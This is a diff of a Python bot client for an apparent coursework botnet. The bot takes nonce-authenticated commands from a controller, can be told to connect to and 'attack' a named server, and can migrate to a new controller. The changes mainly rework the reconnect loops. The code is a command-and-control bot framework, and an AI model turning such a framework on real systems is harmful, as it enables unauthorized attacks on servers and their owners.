@@ -12,7 +12,6 @@ import argparse
 import socket
 import sys
 import os
-#import base64
 import hashlib
 import shlex
 import time
@@ -23,7 +22,7 @@ from typing import Union
 seen_nonces = list()
 
 # Count of commands seen and executed
-commands_exe = 0    #maybe change so its not global
+commands_exe = 0   
 
 # Argument Parsing
 def parse_args():
@@ -52,6 +51,7 @@ def shutdown_cmd(sock: socket, nick: str):
 
 # Implements the command that allows bots to send an attack message to a server
 def attack_server(sock: socket, hostname: str, port: int, nickname: str, nonce: str):
+    global commands_exe
     try:
         # Connect to server being attacked
         attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -86,7 +86,8 @@ def attack_server(sock: socket, hostname: str, port: int, nickname: str, nonce: 
     return
 
 def move_server(host:str, port:int, args:str):
- while(1):
+    global commands_exe
+    while(1):
         try:
             # Connect to specified server
             new_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -100,31 +101,31 @@ def move_server(host:str, port:int, args:str):
 
             print("Connected.")
 
+            # Increase command count            
+            commands_exe += 1
+            # If successful connection, run the bot on the new server
+            while(1):
+                try:
+                    client_program(args, new_client_socket)
+                
+                # Lost connection to the server
+                except ConnectionError:
+                    print("lost connection.")
         except ConnectionError:
             # Failed to move to new server
             print("Failed to connect.")
             time.sleep(5)
-        # Increase command count            
-        commands_exe += 1
-        # If successful connection, run the bot on the new server
-        while(1):
-            try:
-                client_program(args, new_client_socket)
-            
-            # Lost connection to the server
-            except ConnectionError:
-                print("lost connection.")
     
 def client_program(args: str, sock: socket):
-    # Split the host and port into separate variables (Ex : csx1:2025)
-    split_hostPort = args.hostname_port.split(":")
-    host = split_hostPort[0]
-    port = int(split_hostPort[1])
 
     # Receive the command that the controller has given to the bot
     command = sock.recv(1024).decode()
 
-    
+    if(command == ''):
+        print("lost connection.")
+        main()
+
+
     cmd_data = command.split()
     global commands_exe
     # Authenticate the command:
@@ -184,16 +185,16 @@ def main():
 
             print("Connected.")
 
+            while(1):
+                try:
+                    client_program(args, client_socket)
+
+                except ConnectionError:
+                    print("lost connection.")
+
         except ConnectionError:
             print("Failed to connect.")
             time.sleep(5)
-
-        while(1):
-            try:
-                client_program(args, client_socket)
-
-            except ConnectionError:
-                print("lost connection.")
 
 
 
